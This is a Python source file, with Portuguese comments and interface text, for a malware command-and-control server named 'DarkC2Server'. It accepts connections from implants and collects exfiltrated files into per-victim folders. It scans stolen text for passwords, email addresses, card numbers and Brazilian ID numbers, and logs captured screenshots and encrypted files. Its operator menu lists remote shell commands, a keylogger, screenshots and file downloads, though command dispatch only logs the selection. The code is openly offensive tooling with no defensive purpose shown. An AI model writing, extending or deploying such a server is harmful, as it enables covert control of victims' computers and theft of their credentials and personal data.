import os
import sys
import json
import socket
import threading
import hashlib
import time
from datetime import datetime
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.progress import Progress
from rich.prompt import Prompt, IntPrompt  # Importação adicionada

console = Console()

class DarkC2Server:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 6666
        self.clients = {}
        self.session_counter = 0
        self.server_key = Fernet.generate_key()
        self.cipher = Fernet(self.server_key)
        self.data_dir = "collected_data"
        self._setup()

    def _setup(self):
        """Configuração inicial do servidor"""
        if not os.path.exists(self.data_dir):
            os.makedirs(self.data_dir)
        
        # Cria arquivo de chaves de sessão
        if not os.path.exists("session_keys.txt"):
            with open("session_keys.txt", "w") as f:
                f.write(f"CHAVE-MESTRA: {self.server_key.decode()}\n")

    def _show_banner(self):
        banner = """
[bold red]
 ▄████████  ▄█     ▄████████    ▄█   ▄█▄    ▄████████ 
███    ███ ███    ███    ███   ███ ▄███▀   ███    ███ 
███    █▀  ███▌   ███    █▀    ███▐██▀     ███    █▀  
███        ███▌  ▄███▄▄▄      ▄█████▀     ▄███▄▄▄     
███        ███▌ ▀▀███▀▀▀     ▀▀█████▄    ▀▀███▀▀▀     
███    █▄  ███    ███    █▄    ███▐██▄     ███    █▄  
███    ███ ███    ███    ███   ███ ▀███▄   ███    ███ 
████████▀  █▀     ██████████   ███   ▀█▀   ██████████ 
                          ▀                          
[/bold red]
[bold white on red]        DARK C2 SERVER - ESPERE PELA ESCURIDÃO[/bold white on red]
[blink bold red]⚠️ TODAS AS CONEXÕES SÃO LOGADAS E MONITORADAS ⚠️[/blink bold red]
"""
        console.print(banner)

    def _log_event(self, event_type, client_ip, details=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{event_type}] {client_ip} {details}\n"
        
        with open("c2_server.log", "a") as f:
            f.write(log_entry)
        
        # Exibe no console com cores diferentes
        if "NOVA" in event_type:
            console.print(f"[green][{timestamp}][/green] [bold white on green]{event_type}[/bold white on green] {client_ip} {details}")
        elif "DADO" in event_type:
            console.print(f"[blue][{timestamp}][/blue] [bold white on blue]{event_type}[/bold white on blue] {client_ip} {details}")
        elif "ERRO" in event_type:
            console.print(f"[red][{timestamp}][/red] [bold white on red]{event_type}[/bold white on red] {client_ip} {details}")

    def _handle_client(self, conn, addr):
        """Manipula a conexão com um cliente"""
        client_ip = addr[0]
        session_id = f"SESS-{self.session_counter:04d}-{hashlib.md5(client_ip.encode()).hexdigest()[:6]}"
        self.session_counter += 1
        
        try:
            # Envia chave de sessão criptografada
            session_key = Fernet.generate_key()
            encrypted_key = self.cipher.encrypt(session_key)
            conn.sendall(encrypted_key + b"\nEND_KEY\n")
            
            self.clients[session_id] = {
                "ip": client_ip,
                "session_key": session_key,
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "ACTIVE"
            }
            
            self._log_event("NOVA-CONEXAO", client_ip, f"Sessão: {session_id}")
            
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                
                try:
                    # Decripta os dados recebidos
                    decrypted_data = Fernet(session_key).decrypt(data).decode()
                    
                    if decrypted_data.startswith("FILE:"):
                        # Handle file upload
                        self._handle_file_upload(conn, decrypted_data[5:], session_id, client_ip)
                    else:
                        # Comando normal
                        self._process_command(decrypted_data, session_id, client_ip)
                        
                except Exception as e:
                    self._log_event("ERRO-PROCESSAMENTO", client_ip, f"Erro: {str(e)}")
                    continue
                    
        except Exception as e:
            self._log_event("ERRO-CONEXAO", client_ip, f"Erro: {str(e)}")
        finally:
            conn.close()
            self.clients[session_id]["status"] = "DISCONNECTED"
            self._log_event("CONEXAO-ENCERRADA", client_ip, f"Sessão: {session_id}")

    def _handle_file_upload(self, conn, file_metadata, session_id, client_ip):
        try:
            metadata = json.loads(file_metadata)
            filename = metadata["filename"]
            filesize = int(metadata["size"])
            filehash = metadata["hash"]
            
            self._log_event("UPLOAD-INICIADO", client_ip, f"Arquivo: {filename} ({filesize} bytes)")
            
            client_dir = os.path.join(self.data_dir, session_id)
            if not os.path.exists(client_dir):
                os.makedirs(client_dir)
            
            filepath = os.path.join(client_dir, filename)
            
            with open(filepath, "wb") as f:
                remaining = filesize
                while remaining > 0:
                    data = conn.recv(4096)
                    if not data:
                        break
                    f.write(data)
                    remaining -= len(data)
            
            # Verifica hash do arquivo
            with open(filepath, "rb") as f:
                local_hash = hashlib.sha256(f.read()).hexdigest()
            
            if local_hash == filehash:
                self._log_event("UPLOAD-COMPLETO", client_ip, 
                              f"Arquivo: {filename} | Hash: {filehash[:8]}... | Sessão: {session_id}")
                
                # Analisa o tipo de arquivo
                if filename.endswith((".txt", ".log")):
                    self._analyze_text_file(filepath, session_id, client_ip)
                elif filename.endswith((".jpg", ".png", ".bmp")):
                    self._analyze_image_file(filepath, session_id, client_ip)
                elif filename.endswith(".encrypted"):
                    self._log_event("DADO-RECEBIDO", client_ip, 
                                   f"[bold red]ARQUIVO CRIPTOGRAFADO RECEBIDO![/bold red]")
            else:
                self._log_event("ERRO-UPLOAD", client_ip, "Falha na verificação do hash")
                os.remove(filepath)
                
        except Exception as e:
            self._log_event("ERRO-UPLOAD", client_ip, f"Erro: {str(e)}")

    def _analyze_text_file(self, filepath, session_id, client_ip):
        """Analisa arquivos de texto em busca de informações sensíveis"""
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read(5000)  # Lê apenas os primeiros 5KB
            
            # Procura por padrões interessantes
            patterns = {
                "senha": ["senha", "password", "passwd", "credencial"],
                "email": ["@", "mail", "e-mail"],
                "cartao": ["cartao", "card", "credito", "débito", "numero"],
                "documento": ["cpf", "rg", "cnpj", "documento"]
            }
            
            findings = {}
            for category, terms in patterns.items():
                found = [term for term in terms if term in content.lower()]
                if found:
                    findings[category] = found
            
            if findings:
                self._log_event("DADO-SENSIVEL", client_ip, 
                              f"Padrões encontrados: {', '.join(findings.keys())}")

    def _analyze_image_file(self, filepath, session_id, client_ip):
        """Registra recebimento de imagens"""
        self._log_event("DADO-RECEBIDO", client_ip, 
                       f"[bold yellow]IMAGEM CAPTURADA[/bold yellow] | Tamanho: {os.path.getsize(filepath)} bytes")

    def _process_command(self, command, session_id, client_ip):
        """Processa comandos recebidos dos clientes"""
        try:
            cmd_data = json.loads(command)
            cmd_type = cmd_data.get("type")
            
            if cmd_type == "checkin":
                self.clients[session_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self.clients[session_id]["system_info"] = cmd_data.get("system_info", {})
                
            elif cmd_type == "status":
                self._log_event("STATUS-CLIENTE", client_ip, 
                              f"Status: {cmd_data.get('status')} | Info: {cmd_data.get('info')}")
                
            elif cmd_type == "error":
                self._log_event("ERRO-CLIENTE", client_ip, 
                              f"[bold red]ERRO: {cmd_data.get('message')}[/bold red]")
                
            elif cmd_type == "data":
                self._save_client_data(session_id, cmd_data.get("data_type"), cmd_data.get("data"))
                self._log_event("DADO-RECEBIDO", client_ip, 
                              f"Tipo: {cmd_data.get('data_type')} | Tamanho: {len(str(cmd_data.get('data')))} bytes")
                
        except Exception as e:
            self._log_event("ERRO-COMANDO", client_ip, f"Erro ao processar comando: {str(e)}")

    def _save_client_data(self, session_id, data_type, data):
        client_dir = os.path.join(self.data_dir, session_id)
        if not os.path.exists(client_dir):
            os.makedirs(client_dir)
        
        filename = f"{data_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(client_dir, filename)
        
        with open(filepath, "w") as f:
            json.dump(data, f)

    def _show_dashboard(self):
        """Exibe o dashboard interativo do C2"""
        while True:
            console.clear()
            self._show_banner()
            
            # Estatísticas rápidas
            active_clients = sum(1 for c in self.clients.values() if c["status"] == "ACTIVE")
            total_clients = len(self.clients)
            
            console.print(Panel.fit(
                f"[bold]ESTATÍSTICAS:[/bold] [green]{active_clients}[/green] ativos | [yellow]{total_clients}[/yellow] totais",
                border_style="blue"
            ))
            
            # Lista de clientes
            table = Table(title="[bold]CLIENTES CONECTADOS[/bold]", show_header=True, header_style="bold magenta")
            table.add_column("Sessão ID", style="cyan")
            table.add_column("IP", style="green")
            table.add_column("Última Atividade")
            table.add_column("Status", style="red")
            
            for sess_id, client in sorted(self.clients.items(), 
                                        key=lambda x: x[1]["last_seen"], reverse=True):
                status_style = "green" if client["status"] == "ACTIVE" else "red"
                table.add_row(
                    sess_id,
                    client["ip"],
                    client["last_seen"],
                    f"[{status_style}]{client['status']}[/{status_style}]"
                )
            
            console.print(table)
            
            # Menu de controle
            console.print(Panel.fit(
                "[bold]COMANDOS DISPONÍVEIS:[/bold]\n"
                "1. Enviar comando para cliente\n"
                "2. Visualizar dados coletados\n"
                "3. Exportar sessões\n"
                "4. Limpar console\n"
                "0. Encerrar servidor",
                border_style="yellow"
            ))
            
            choice = Prompt.ask(
                "[blink red]➤[/blink red] Selecione uma opção",
                choices=["0", "1", "2", "3", "4"],
                show_choices=False
            )
            
            if choice == "0":
                self._shutdown_server()
                break
            elif choice == "1":
                self._send_client_command()
            elif choice == "2":
                self._view_collected_data()
            elif choice == "3":
                self._export_sessions()
            elif choice == "4":
                continue

    def _send_client_command(self):
        if not self.clients:
            console.print("[red]Nenhum cliente conectado![/red]")
            input("\nPressione Enter para continuar...")
            return
        
        # Selecionar cliente
        table = Table(title="Selecione um cliente", show_header=True, header_style="bold blue")
        table.add_column("ID", style="cyan")
        table.add_column("IP", style="green")
        table.add_column("Status", style="red")
        
        clients_list = list(self.clients.items())
        for i, (sess_id, client) in enumerate(clients_list, 1):
            status_style = "green" if client["status"] == "ACTIVE" else "red"
            table.add_row(
                str(i),
                client["ip"],
                f"[{status_style}]{client['status']}[/{status_style}]"
            )
        
        console.print(table)
        
        try:
            choice = IntPrompt.ask(
                "[yellow]?[/yellow] Selecione o cliente (0 para cancelar)",
                choices=[str(i) for i in range(0, len(clients_list)+1)],
                show_choices=False
            )
            
            if choice == 0:
                return
                
            selected_session = clients_list[choice-1][0]
            selected_client = clients_list[choice-1][1]
            
            if selected_client["status"] != "ACTIVE":
                console.print("[red]Cliente não está ativo![/red]")
                input("\nPressione Enter para continuar...")
                return
            
            # Selecionar comando
            console.print(Panel.fit(
                "[bold]COMANDOS DISPONÍVEIS:[/bold]\n"
                "1. Coletar informações do sistema\n"
                "2. Executar comando shell\n"
                "3. Capturar screenshot\n"
                "4. Iniciar keylogger\n"
                "5. Download de arquivo\n",
                border_style="blue"
            ))
            
            cmd_choice = Prompt.ask(
                "[yellow]?[/yellow] Selecione o comando",
                choices=["1", "2", "3", "4", "5"],
                show_choices=False
            )
            
            console.print(f"[green]✓ Comando enviado para {selected_client['ip']}[/green]")
            self._log_event("COMANDO-ENVIADO", selected_client["ip"], f"Tipo: {cmd_choice}")
            
        except Exception as e:
            console.print(f"[red]Erro: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")

    def _view_collected_data(self):
        """Exibe dados coletados dos clientes"""
        if not os.path.exists(self.data_dir) or not os.listdir(self.data_dir):
            console.print("[red]Nenhum dado coletado ainda![/red]")
            input("\nPressione Enter para continuar...")
            return
        
        # Lista sessões com dados
        sessions = [d for d in os.listdir(self.data_dir) 
                   if os.path.isdir(os.path.join(self.data_dir, d))]
        
        table = Table(title="Sessões com dados coletados", show_header=True, header_style="bold blue")
        table.add_column("ID", style="cyan")
        table.add_column("IP", style="green")
        table.add_column("Arquivos", style="yellow")
        
        for i, sess_id in enumerate(sessions, 1):
            client_ip = self.clients.get(sess_id, {}).get("ip", "DESCONHECIDO")
            files = len(os.listdir(os.path.join(self.data_dir, sess_id)))
            table.add_row(str(i), client_ip, str(files))
        
        console.print(table)
        
        try:
            choice = IntPrompt.ask(
                "[yellow]?[/yellow] Selecione a sessão para ver (0 para cancelar)",
                choices=[str(i) for i in range(0, len(sessions)+1)],
                show_choices=False
            )
            
            if choice == 0:
                return
                
            selected_session = sessions[choice-1]
            self._show_session_data(selected_session)
            
        except Exception as e:
            console.print(f"[red]Erro: {str(e)}[/red]")
            input("\nPressione Enter para continuar...")

    def _show_session_data(self, session_id):
        session_dir = os.path.join(self.data_dir, session_id)
        files = os.listdir(session_dir)
        
        while True:
            console.clear()
            console.print(Panel.fit(
                f"[bold]DADOS DA SESSÃO: [cyan]{session_id}[/cyan][/bold]",
                border_style="blue"
            ))
            
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("ID", style="cyan")
            table.add_column("Arquivo", style="green")
            table.add_column("Tamanho", style="yellow")
            table.add_column("Tipo", style="blue")
            
            for i, filename in enumerate(files, 1):
                filepath = os.path.join(session_dir, filename)
                size = os.path.getsize(filepath)
                filetype = "JSON" if filename.endswith(".json") else "Imagem" if filename.lower().endswith((".jpg", ".png")) else "Texto" if filename.endswith(".txt") else "Outro"
                table.add_row(str(i), filename, f"{size} bytes", filetype)
            
            console.print(table)
            
            choice = Prompt.ask(
                "[yellow]?[/yellow] Selecione um arquivo para ver (0 para voltar)",
                choices=[str(i) for i in range(0, len(files)+1)],
                show_choices=False
            )
            
            if choice == "0":
                return
                
            selected_file = files[int(choice)-1]
            self._display_file_content(session_dir, selected_file)

    def _display_file_content(self, session_dir, filename):
        filepath = os.path.join(session_dir, filename)
        
        try:
            if filename.endswith(".json"):
                with open(filepath, "r") as f:
                    data = json.load(f)
                console.print(Panel.fit(
                    json.dumps(data, indent=2),
                    title=f"[bold]{filename}[/bold]",
                    border_style="green"
                ))
            elif filename.lower().endswith((".jpg", ".png", ".bmp")):
                console.print(Panel.fit(
                    f"[bold yellow]IMAGEM: {filename}[/bold yellow]\n"
                    f"Tamanho: {os.path.getsize(filepath)} bytes\n"
                    f"Caminho: {filepath}",
                    border_style="yellow"
                ))
            else:
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(2000)  # Limita a 2000 caracteres para visualização
                console.print(Panel.fit(
                    content,
                    title=f"[bold]{filename}[/bold]",
                    border_style="blue"
                ))
            
            input("\nPressione Enter para continuar...")
        except Exception as e:
            console.print(f"[red]Erro ao ler arquivo: {str(e)}[/red]")
            input("\nPressione Enter para continuar...")

    def _export_sessions(self):
        """Exporta dados das sessões para um arquivo compactado"""
        console.print("[cyan]▶ Preparando exportação de dados...[/cyan]")
        
        try:
            import zipfile
            export_file = f"c2_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            
            with zipfile.ZipFile(export_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.data_dir):
                    for file in files:
                        filepath = os.path.join(root, file)
                        arcname = os.path.relpath(filepath, self.data_dir)
                        zipf.write(filepath, arcname)
            
            console.print(Panel.fit(
                f"[green]✓ Dados exportados para [bold]{export_file}[/bold][/green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao exportar dados: {str(e)}[/red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")

    def _shutdown_server(self):
        """Encerra o servidor de forma controlada"""
        console.print(Panel.fit(
            "[blink bold red]⛧ ENCERRANDO SERVIDOR C2 ⛧[/blink bold red]",
            border_style="red"
        ))
        
        with Progress() as progress:
            task = progress.add_task("[red]Encerrando...", total=100)
            for i in range(100):
                progress.update(task, advance=1)
                time.sleep(0.02)
        
        console.print("[cyan]Registros de log salvos em c2_server.log[/cyan]")
        console.print("[red]Servidor encerrado.[/red]")
        time.sleep(1)

    def start(self):
        """Inicia o servidor C2"""
        self._show_banner()
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((self.host, self.port))
                s.listen(5)
                
                console.print(Panel.fit(
                    f"[bold green]Servidor C2 ativo em [yellow]{self.host}:{self.port}[/yellow][/bold green]\n"
                    f"[cyan]Chave mestra:[/cyan] [bold]{self.server_key.decode()}[/bold]",
                    border_style="green"
                ))
                
                # Thread para aceitar conexões
                def accept_connections():
                    while True:
                        conn, addr = s.accept()
                        client_thread = threading.Thread(
                            target=self._handle_client,
                            args=(conn, addr),
                            daemon=True
                        )
                        client_thread.start()
                
                accept_thread = threading.Thread(target=accept_connections, daemon=True)
                accept_thread.start()
                
                # Inicia dashboard interativo
                self._show_dashboard()
                
        except Exception as e:
            console.print(Panel.fit(
                f"[bold red]ERRO: {str(e)}[/bold red]",
                border_style="red"
            ))
            sys.exit(1)

if __name__ == '__main__':
    server = DarkC2Server()
    server.start()
